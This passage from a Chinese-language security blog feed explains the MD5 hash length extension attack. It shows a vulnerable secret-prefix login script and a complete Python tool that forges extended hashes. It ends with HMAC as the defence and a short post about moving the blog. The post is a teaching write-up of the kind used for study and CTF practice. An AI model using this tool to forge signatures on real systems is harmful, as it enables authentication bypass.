<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="keyword">import</span> hashlib</div><div class="line"><span class="keyword">import</span> sys</div><div class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> unquote</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(password, hash_val)</span>:</span></div><div class="line">    m = hashlib.md5()</div><div class="line">    secret_key = <span class="string">"message"</span></div><div class="line">    m.update(secret_key + password)</div><div class="line">    <span class="keyword">if</span>(m.hexdigest() == hash_val):</div><div class="line">        <span class="keyword">print</span> <span class="string">"Login Successful!"</span></div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="keyword">print</span> <span class="string">"Login Failed"</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</div><div class="line">    password = unquote(sys.argv[<span class="number">1</span>])</div><div class="line">    hash_val = unquote(sys.argv[<span class="number">2</span>])</div><div class="line">    login(password, hash_val)</div></pre></td></tr></table></figure>
<p>现在只知道一组用户名和hash，root和f3c36e01c874865bc081e4ae7af037ea</p>
<p><img src="http://i.imgur.com/eisLG81.png" alt=""></p>
<p>由分析可知，我们在知道secret_key长度的情况下，可以伪造padding，再通过追加字符串可以算出secret+padding+追加字符串的MD5值。假设我们追加的字符串为admin，则通过哈希扩展攻击计算出md5(secret+padding+追加字符串) = e53a681a30ff99e3f6522270ca7db244。然后我们测试一下，显示登录成功：</p>
<p><img src="http://i.imgur.com/Ppmoqyo.png" alt=""></p>
<p>md5扩展攻击代码如下(网上找的稍作修改，用法：python md5.py 攻击的md5 追加的消息 secret的长度):</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="comment"># coding:utf-8    </span></div><div class="line"><span class="keyword">import</span> sys</div><div class="line"><span class="keyword">import</span> struct</div><div class="line"><span class="keyword">import</span> hashlib</div><div class="line"><span class="keyword">import</span> binascii</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">F</span><span class="params">(x, y, z)</span>:</span></div><div class="line">    <span class="keyword">return</span> (x &amp; y) | ((~x) &amp; z)</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">G</span><span class="params">(x, y, z)</span>:</span></div><div class="line">    <span class="keyword">return</span> (x &amp; z) | (y &amp; (~z))</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">H</span><span class="params">(x, y, z)</span>:</span></div><div class="line">    <span class="keyword">return</span> x ^ y ^ z</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">I</span><span class="params">(x, y, z)</span>:</span></div><div class="line">    <span class="keyword">return</span> y ^ (x | (~z))</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">_rotateLeft</span><span class="params">( x, n)</span>:</span></div><div class="line">    <span class="keyword">return</span> (x &lt;&lt; n) | (x &gt;&gt; (<span class="number">32</span>-n))</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">XX</span><span class="params">(func, a, b, c, d, x, s, ac)</span>:</span></div><div class="line">    res = <span class="number">0L</span></div><div class="line">    res = res + a + func(b, c, d)</div><div class="line">    res = res + x</div><div class="line">    res = res + ac</div><div class="line">    res = res &amp; <span class="number">0xffffffffL</span></div><div class="line">    res = _rotateLeft(res, s)</div><div class="line">    res = res &amp; <span class="number">0xffffffffL</span></div><div class="line">    res = res + b</div><div class="line"></div><div class="line">    <span class="keyword">return</span> res &amp; <span class="number">0xffffffffL</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">md5</span><span class="params">()</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></div><div class="line">        self.A, self.B, self.C, self.D = (<span class="number">0x67452301L</span>, <span class="number">0xefcdab89L</span>, <span class="number">0x98badcfeL</span>, <span class="number">0x10325476L</span>)</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">md5_compress</span><span class="params">(self, buf)</span>:</span></div><div class="line">        <span class="keyword">if</span> len(buf) != <span class="number">64</span>:</div><div class="line">            <span class="keyword">raise</span> ValueError, <span class="string">"Invalid buffer of length %d: %s"</span> % (len(buf), repr(buf))</div><div class="line">        inp = struct.unpack(<span class="string">"I"</span>*<span class="number">16</span>, buf)</div><div class="line">        a, b, c, d = self.A, self.B, self.C, self.D</div><div class="line"></div><div class="line">        <span class="comment"># Round 1.</span></div><div class="line">        S11, S12, S13, S14 = <span class="number">7</span>, <span class="number">12</span>, <span class="number">17</span>, <span class="number">22</span></div><div class="line"></div><div class="line">        a = XX(F, a, b, c, d, inp[<span class="number">0</span>], S11, <span class="number">0xD76AA478L</span>) <span class="comment"># 1</span></div><div class="line">        d = XX(F, d, a, b, c, inp[<span class="number">1</span>], S12, <span class="number">0xE8C7B756L</span>) <span class="comment"># 2</span></div><div class="line">        c = XX(F, c, d, a, b, inp[<span class="number">2</span>], S13, <span class="number">0x242070DBL</span>) <span class="comment"># 3</span></div><div class="line">        b = XX(F, b, c, d, a, inp[<span class="number">3</span>], S14, <span class="number">0xC1BDCEEEL</span>) <span class="comment"># 4</span></div><div class="line">        a = XX(F, a, b, c, d, inp[<span class="number">4</span>], S11, <span class="number">0xF57C0FAFL</span>) <span class="comment"># 5</span></div><div class="line">        d = XX(F, d, a, b, c, inp[<span class="number">5</span>], S12, <span class="number">0x4787C62AL</span>) <span class="comment"># 6</span></div><div class="line">        c = XX(F, c, d, a, b, inp[<span class="number">6</span>], S13, <span class="number">0xA8304613L</span>) <span class="comment"># 7</span></div><div class="line">        b = XX(F, b, c, d, a, inp[<span class="number">7</span>], S14, <span class="number">0xFD469501L</span>) <span class="comment"># 8</span></div><div class="line">        a = XX(F, a, b, c, d, inp[<span class="number">8</span>], S11, <span class="number">0x698098D8L</span>) <span class="comment"># 9</span></div><div class="line">        d = XX(F, d, a, b, c, inp[<span class="number">9</span>], S12, <span class="number">0x8B44F7AFL</span>) <span class="comment"># 10</span></div><div class="line">        c = XX(F, c, d, a, b, inp[<span class="number">10</span>], S13, <span class="number">0xFFFF5BB1L</span>) <span class="comment"># 11</span></div><div class="line">        b = XX(F, b, c, d, a, inp[<span class="number">11</span>], S14, <span class="number">0x895CD7BEL</span>) <span class="comment"># 12</span></div><div class="line">        a = XX(F, a, b, c, d, inp[<span class="number">12</span>], S11, <span class="number">0x6B901122L</span>) <span class="comment"># 13</span></div><div class="line">        d = XX(F, d, a, b, c, inp[<span class="number">13</span>], S12, <span class="number">0xFD987193L</span>) <span class="comment"># 14</span></div><div class="line">        c = XX(F, c, d, a, b, inp[<span class="number">14</span>], S13, <span class="number">0xA679438EL</span>) <span class="comment"># 15</span></div><div class="line">        b = XX(F, b, c, d, a, inp[<span class="number">15</span>], S14, <span class="number">0x49B40821L</span>) <span class="comment"># 16</span></div><div class="line"></div><div class="line">        <span class="comment"># Round 2.</span></div><div class="line">        S21, S22, S23, S24 = <span class="number">5</span>, <span class="number">9</span>, <span class="number">14</span>, <span class="number">20</span></div><div class="line"></div><div class="line">        a = XX(G, a, b, c, d, inp[<span class="number">1</span>], S21, <span class="number">0xF61E2562L</span>) <span class="comment"># 17</span></div><div class="line">        d = XX(G, d, a, b, c, inp[<span class="number">6</span>], S22, <span class="number">0xC040B340L</span>) <span class="comment"># 18</span></div><div class="line">        c = XX(G, c, d, a, b, inp[<span class="number">11</span>], S23, <span class="number">0x265E5A51L</span>) <span class="comment"># 19</span></div><div class="line">        b = XX(G, b, c, d, a, inp[<span class="number">0</span>], S24, <span class="number">0xE9B6C7AAL</span>) <span class="comment"># 20</span></div><div class="line">        a = XX(G, a, b, c, d, inp[<span class="number">5</span>], S21, <span class="number">0xD62F105DL</span>) <span class="comment"># 21</span></div><div class="line">        d = XX(G, d, a, b, c, inp[<span class="number">10</span>], S22, <span class="number">0x02441453L</span>) <span class="comment"># 22</span></div><div class="line">        c = XX(G, c, d, a, b, inp[<span class="number">15</span>], S23, <span class="number">0xD8A1E681L</span>) <span class="comment"># 23</span></div><div class="line">        b = XX(G, b, c, d, a, inp[<span class="number">4</span>], S24, <span class="number">0xE7D3FBC8L</span>) <span class="comment"># 24</span></div><div class="line">        a = XX(G, a, b, c, d, inp[<span class="number">9</span>], S21, <span class="number">0x21E1CDE6L</span>) <span class="comment"># 25</span></div><div class="line">        d = XX(G, d, a, b, c, inp[<span class="number">14</span>], S22, <span class="number">0xC33707D6L</span>) <span class="comment"># 26</span></div><div class="line">        c = XX(G, c, d, a, b, inp[<span class="number">3</span>], S23, <span class="number">0xF4D50D87L</span>) <span class="comment"># 27</span></div><div class="line">        b = XX(G, b, c, d, a, inp[<span class="number">8</span>], S24, <span class="number">0x455A14EDL</span>) <span class="comment"># 28</span></div><div class="line">        a = XX(G, a, b, c, d, inp[<span class="number">13</span>], S21, <span class="number">0xA9E3E905L</span>) <span class="comment"># 29</span></div><div class="line">        d = XX(G, d, a, b, c, inp[<span class="number">2</span>], S22, <span class="number">0xFCEFA3F8L</span>) <span class="comment"># 30</span></div><div class="line">        c = XX(G, c, d, a, b, inp[<span class="number">7</span>], S23, <span class="number">0x676F02D9L</span>) <span class="comment"># 31</span></div><div class="line">        b = XX(G, b, c, d, a, inp[<span class="number">12</span>], S24, <span class="number">0x8D2A4C8AL</span>) <span class="comment"># 32</span></div><div class="line"></div><div class="line">        <span class="comment"># Round 3.</span></div><div class="line">        S31, S32, S33, S34 = <span class="number">4</span>, <span class="number">11</span>, <span class="number">16</span>, <span class="number">23</span></div><div class="line"></div><div class="line">        a = XX(H, a, b, c, d, inp[<span class="number">5</span>], S31, <span class="number">0xFFFA3942L</span>) <span class="comment"># 33</span></div><div class="line">        d = XX(H, d, a, b, c, inp[<span class="number">8</span>], S32, <span class="number">0x8771F681L</span>) <span class="comment"># 34</span></div><div class="line">        c = XX(H, c, d, a, b, inp[<span class="number">11</span>], S33, <span class="number">0x6D9D6122L</span>) <span class="comment"># 35</span></div><div class="line">        b = XX(H, b, c, d, a, inp[<span class="number">14</span>], S34, <span class="number">0xFDE5380CL</span>) <span class="comment"># 36</span></div><div class="line">        a = XX(H, a, b, c, d, inp[<span class="number">1</span>], S31, <span class="number">0xA4BEEA44L</span>) <span class="comment"># 37</span></div><div class="line">        d = XX(H, d, a, b, c, inp[<span class="number">4</span>], S32, <span class="number">0x4BDECFA9L</span>) <span class="comment"># 38</span></div><div class="line">        c = XX(H, c, d, a, b, inp[<span class="number">7</span>], S33, <span class="number">0xF6BB4B60L</span>) <span class="comment"># 39</span></div><div class="line">        b = XX(H, b, c, d, a, inp[<span class="number">10</span>], S34, <span class="number">0xBEBFBC70L</span>) <span class="comment"># 40</span></div><div class="line">        a = XX(H, a, b, c, d, inp[<span class="number">13</span>], S31, <span class="number">0x289B7EC6L</span>) <span class="comment"># 41</span></div><div class="line">        d = XX(H, d, a, b, c, inp[<span class="number">0</span>], S32, <span class="number">0xEAA127FAL</span>) <span class="comment"># 42</span></div><div class="line">        c = XX(H, c, d, a, b, inp[<span class="number">3</span>], S33, <span class="number">0xD4EF3085L</span>) <span class="comment"># 43</span></div><div class="line">        b = XX(H, b, c, d, a, inp[<span class="number">6</span>], S34, <span class="number">0x04881D05L</span>) <span class="comment"># 44</span></div><div class="line">        a = XX(H, a, b, c, d, inp[<span class="number">9</span>], S31, <span class="number">0xD9D4D039L</span>) <span class="comment"># 45</span></div><div class="line">        d = XX(H, d, a, b, c, inp[<span class="number">12</span>], S32, <span class="number">0xE6DB99E5L</span>) <span class="comment"># 46</span></div><div class="line">        c = XX(H, c, d, a, b, inp[<span class="number">15</span>], S33, <span class="number">0x1FA27CF8L</span>) <span class="comment"># 47</span></div><div class="line">        b = XX(H, b, c, d, a, inp[<span class="number">2</span>], S34, <span class="number">0xC4AC5665L</span>) <span class="comment"># 48</span></div><div class="line"></div><div class="line">        <span class="comment"># Round 4.</span></div><div class="line">        S41, S42, S43, S44 = <span class="number">6</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">21</span></div><div class="line"></div><div class="line">        a = XX(I, a, b, c, d, inp[<span class="number">0</span>], S41, <span class="number">0xF4292244L</span>) <span class="comment"># 49</span></div><div class="line">        d = XX(I, d, a, b, c, inp[<span class="number">7</span>], S42, <span class="number">0x432AFF97L</span>) <span class="comment"># 50</span></div><div class="line">        c = XX(I, c, d, a, b, inp[<span class="number">14</span>], S43, <span class="number">0xAB9423A7L</span>) <span class="comment"># 51</span></div><div class="line">        b = XX(I, b, c, d, a, inp[<span class="number">5</span>], S44, <span class="number">0xFC93A039L</span>) <span class="comment"># 52</span></div><div class="line">        a = XX(I, a, b, c, d, inp[<span class="number">12</span>], S41, <span class="number">0x655B59C3L</span>) <span class="comment"># 53</span></div><div class="line">        d = XX(I, d, a, b, c, inp[<span class="number">3</span>], S42, <span class="number">0x8F0CCC92L</span>) <span class="comment"># 54</span></div><div class="line">        c = XX(I, c, d, a, b, inp[<span class="number">10</span>], S43, <span class="number">0xFFEFF47DL</span>) <span class="comment"># 55</span></div><div class="line">        b = XX(I, b, c, d, a, inp[<span class="number">1</span>], S44, <span class="number">0x85845DD1L</span>) <span class="comment"># 56</span></div><div class="line">        a = XX(I, a, b, c, d, inp[<span class="number">8</span>], S41, <span class="number">0x6FA87E4FL</span>) <span class="comment"># 57</span></div><div class="line">        d = XX(I, d, a, b, c, inp[<span class="number">15</span>], S42, <span class="number">0xFE2CE6E0L</span>) <span class="comment"># 58</span></div><div class="line">        c = XX(I, c, d, a, b, inp[<span class="number">6</span>], S43, <span class="number">0xA3014314L</span>) <span class="comment"># 59</span></div><div class="line">        b = XX(I, b, c, d, a, inp[<span class="number">13</span>], S44, <span class="number">0x4E0811A1L</span>) <span class="comment"># 60</span></div><div class="line">        a = XX(I, a, b, c, d, inp[<span class="number">4</span>], S41, <span class="number">0xF7537E82L</span>) <span class="comment"># 61</span></div><div class="line">        d = XX(I, d, a, b, c, inp[<span class="number">11</span>], S42, <span class="number">0xBD3AF235L</span>) <span class="comment"># 62</span></div><div class="line">        c = XX(I, c, d, a, b, inp[<span class="number">2</span>], S43, <span class="number">0x2AD7D2BBL</span>) <span class="comment"># 63</span></div><div class="line">        b = XX(I, b, c, d, a, inp[<span class="number">9</span>], S44, <span class="number">0xEB86D391L</span>) <span class="comment"># 64</span></div><div class="line"></div><div class="line">        self.A = (self.A + a) &amp; <span class="number">0xffffffffL</span></div><div class="line">        self.B = (self.B + b) &amp; <span class="number">0xffffffffL</span></div><div class="line">        self.C = (self.C + c) &amp; <span class="number">0xffffffffL</span></div><div class="line">        self.D = (self.D + d) &amp; <span class="number">0xffffffffL</span></div><div class="line">        <span class="comment"># print 'A=%s\nB=%s\nC=%s\nD=%s\n' % (hex(self.A), hex(self.B), hex(self.C), hex(self.D))</span></div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">padding</span><span class="params">(self, n, sz=None)</span>:</span></div><div class="line">        <span class="keyword">if</span> sz <span class="keyword">is</span> <span class="keyword">None</span>:</div><div class="line">            sz = n</div><div class="line">        pre = <span class="number">64</span><span class="number">-8</span></div><div class="line">        sz = struct.pack(<span class="string">"Q"</span>,sz*<span class="number">8</span>)</div><div class="line">        pad = <span class="string">'\x80'</span></div><div class="line">        n += <span class="number">1</span></div><div class="line">        <span class="keyword">if</span> n % <span class="number">64</span> &lt;= pre:</div><div class="line">            pad += <span class="string">'\x00'</span> * (pre - n % <span class="number">64</span>)</div><div class="line">            pad += sz</div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            pad += <span class="string">'\x00'</span> * (pre + <span class="number">64</span> - n % <span class="number">64</span>)</div><div class="line">            pad += sz</div><div class="line">        <span class="keyword">return</span> pad</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">pad</span><span class="params">(self, msg)</span>:</span></div><div class="line">        <span class="keyword">return</span> msg + self.padding(len(msg))</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">md5_iter</span><span class="params">(self, padding_msg)</span>:</span></div><div class="line">        <span class="keyword">assert</span> len(padding_msg) % <span class="number">64</span> == <span class="number">0</span></div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(padding_msg), <span class="number">64</span>):</div><div class="line">            block = padding_msg[i:i+<span class="number">64</span>]</div><div class="line">            self.md5_compress(padding_msg[i:i+<span class="number">64</span>])</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">digest</span><span class="params">(self)</span>:</span></div><div class="line">        <span class="keyword">return</span> struct.pack(<span class="string">'&lt;IIII'</span>, self.A, self.B, self.C, self.D)</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">hexdigest</span><span class="params">(self)</span>:</span></div><div class="line">        <span class="keyword">return</span> binascii.hexlify(self.digest()).decode()</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">my_md5</span><span class="params">(self, msg)</span>:</span></div><div class="line">        padding_msg = self.pad(msg)</div><div class="line">        self.md5_iter(padding_msg)</div><div class="line">        <span class="keyword">return</span> self.hexdigest()</div><div class="line"></div><div class="line">    <span class="comment"># 通过md5值，逆向算出最后一轮的magic number</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">compute_magic_number</span><span class="params">(self, md5str)</span>:</span></div><div class="line">        self.A = struct.unpack(<span class="string">"I"</span>, md5str[<span class="number">0</span>:<span class="number">8</span>].decode(<span class="string">'hex'</span>))[<span class="number">0</span>]</div><div class="line">        self.B = struct.unpack(<span class="string">"I"</span>, md5str[<span class="number">8</span>:<span class="number">16</span>].decode(<span class="string">'hex'</span>))[<span class="number">0</span>]</div><div class="line">        self.C = struct.unpack(<span class="string">"I"</span>, md5str[<span class="number">16</span>:<span class="number">24</span>].decode(<span class="string">'hex'</span>))[<span class="number">0</span>]</div><div class="line">        self.D = struct.unpack(<span class="string">"I"</span>, md5str[<span class="number">24</span>:<span class="number">32</span>].decode(<span class="string">'hex'</span>))[<span class="number">0</span>]</div><div class="line">        <span class="comment">#print 'A=%s\nB=%s\nC=%s\nD=%s\n' % (hex(self.A), hex(self.B), hex(self.C), hex(self.D))</span></div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">extension_attack</span><span class="params">(self, md5str, str_append, lenth)</span>:</span></div><div class="line">        self.compute_magic_number(md5str)</div><div class="line">        p = self.padding(lenth)</div><div class="line">        padding_msg = self.padding( len(str_append), lenth + len(p) + len(str_append) )</div><div class="line">        self.md5_iter(str_append + padding_msg)</div><div class="line">        <span class="keyword">return</span> self.hexdigest()</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</div><div class="line">    m = md5()</div><div class="line">    </div><div class="line">    <span class="keyword">if</span> len(sys.argv) != <span class="number">4</span>:</div><div class="line">    <span class="comment">#print m.my_md5("123456")</span></div><div class="line">        src = m.pad(sys.argv[<span class="number">1</span>]) + sys.argv[<span class="number">2</span>]</div><div class="line">        <span class="keyword">print</span> <span class="string">'md5 padding          -&gt;'</span>,m.my_md5(src)</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="keyword">print</span> <span class="string">'md5 extension_attack -&gt;'</span>,m.extension_attack(sys.argv[<span class="number">1</span>], sys.argv[<span class="number">2</span>], int(sys.argv[<span class="number">3</span>]))</div></pre></td></tr></table></figure>
<h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>这个攻击方式的原理是，知道一个密文的md5和密文的长度，可以推算出密文与扩展消息拼接后的md5。防范方法也很简单：<br>方法1：用HMAC算法 HMAC(secret||padding)=H(secret||H(secret||padding))<br>方法2：交换secret和padding的位置，即MAC(padding||secret)</p>
<p>通常md5可以作为签名来用，曾经有两个漏洞，亚马逊AWS和Flicker的签名漏洞，均可以通过md5哈希长度扩展攻击。最近也有一个phpwind的洞可用哈希长度扩展攻击。</p>
<p>不过现在这个攻击方式的发展趋势应该是活在CTF中了233333</p>
<h2 id="0x05-引用"><a href="#0x05-引用" class="headerlink" title="0x05 引用"></a>0x05 引用</h2><p><a href="http://www.ietf.org/rfc/rfc1321.txt" target="_blank" rel="external">http://www.ietf.org/rfc/rfc1321.txt</a><br><a href="http://blog.chinaunix.net/uid-27070210-id-3255947.html" target="_blank" rel="external">http://blog.chinaunix.net/uid-27070210-id-3255947.html</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-简介&quot;&gt;&lt;a href=&quot;#0x00-简介&quot; class=&quot;headerlink&quot; title=&quot;0x00 简介&quot;&gt;&lt;/a&gt;0x00 简介&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;Hash，一般翻译做“散列”，也有直接音译为“哈希”的，就是把任意长度的输入（又叫做预映射， pre-image），通过散列算法，变换成固定长度的输出，该输出就是散列值。这种转换是一种压缩映射，也就是，散列值的空间通常远小于输入的空间，不同的输入可能会散列成相同的输出，所以不可能从散列值来唯一的确定输入值。简单的说就是一种将任意长度的消息压缩到某一固定长度的消息摘要的函数。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;–摘自百度&lt;/p&gt;
&lt;p&gt;哈希长度扩展攻击简单的来讲就是：&lt;br&gt;1.知道一个密文(SECRET)的哈希&lt;br&gt;2.知道密文的长度(SECRET LENGTH)&lt;br&gt;在不知道密文的情况下可以推算出密文+填充+追加消息(SECRET+PADDING+EXTRA)的哈希，也就是说在只知道密文长度和密文哈希的情况下，可以预测出密文和另一消息拼接后的哈希。&lt;/p&gt;
    
    </summary>
    
      <category term="技术" scheme="http://weaponx.site/categories/tech/"/>
    
    
      <category term="安全" scheme="http://weaponx.site/tags/%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>关于这个博客</title>
    <link href="http://weaponx.site/2017/01/11/%E5%85%B3%E4%BA%8E%E8%BF%99%E4%B8%AA%E5%8D%9A%E5%AE%A2/"/>
    <id>http://weaponx.site/2017/01/11/关于这个博客/</id>
    <published>2017-01-11T18:19:32.000Z</published>
    <updated>2017-01-17T14:34:07.713Z</updated>
    
    <content type="html"><![CDATA[<h2 id="迁移"><a href="#迁移" class="headerlink" title="迁移"></a>迁移</h2><p>　　之前的用wordpress + mysql在阿里云搭建了一套博客，域名是<em><a href="http://evi1code.com" target="_blank" rel="external">http://evi1code.com</a></em>。维护成本太高了，被别人扫描器扫一下直接被阿里云下线。加上后来后来也懒得去写blog，域名和主机都没续费被回收了。</p>
<p>　　之前接触过静态博客jekyll，也懒得去研究。最近又手痒了，看到朋友都在用Hexo，跑过去研究了一下还真不错<del>据说作者是台湾同胞</del>。</p>
<p>　　先在Github上搭一个试试水，结果Github实在是太慢，现在又迁移到了国内的代码托管网站<em><a href="https://coding.net" target="_blank" rel="external">https://coding.net</a></em>。</p>
<p>　　嗯，就是现在这样子╮(╯▽╰)╭。</p>
<a id="more"></a>
<h2 id="TO-DO"><a href="#TO-DO" class="headerlink" title="TO DO"></a>TO DO</h2><p>1.用七牛云或者CloudFlare加速对图片进行cdn加速<br>2.研究一下高级用法<br>3.开始写写博客</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;迁移&quot;&gt;&lt;a href=&quot;#迁移&quot; class=&quot;headerlink&quot; title=&quot;迁移&quot;&gt;&lt;/a&gt;迁移&lt;/h2&gt;&lt;p&gt;　　之前的用wordpress + mysql在阿里云搭建了一套博客，域名是&lt;em&gt;&lt;a href=&quot;http://evi1code.com&quot;&gt;http://evi1code.com&lt;/a&gt;&lt;/em&gt;。维护成本太高了，被别人扫描器扫一下直接被阿里云下线。加上后来后来也懒得去写blog，域名和主机都没续费被回收了。&lt;/p&gt;
&lt;p&gt;　　之前接触过静态博客jekyll，也懒得去研究。最近又手痒了，看到朋友都在用Hexo，跑过去研究了一下还真不错&lt;del&gt;据说作者是台湾同胞&lt;/del&gt;。&lt;/p&gt;
&lt;p&gt;　　先在Github上搭一个试试水，结果Github实在是太慢，现在又迁移到了国内的代码托管网站&lt;em&gt;&lt;a href=&quot;https://coding.net&quot;&gt;https://coding.net&lt;/a&gt;&lt;/em&gt;。&lt;/p&gt;
&lt;p&gt;　　嗯，就是现在这样子╮(╯▽╰)╭。&lt;/p&gt;
    
    </summary>
    
      <category term="生活" scheme="http://weaponx.site/categories/life/"/>
    
    
      <category term="博客" scheme="http://weaponx.site/tags/%E5%8D%9A%E5%AE%A2/"/>
    
      <category term="Hexo" scheme="http://weaponx.site/tags/Hexo/"/>
    
  </entry>
  
</feed>
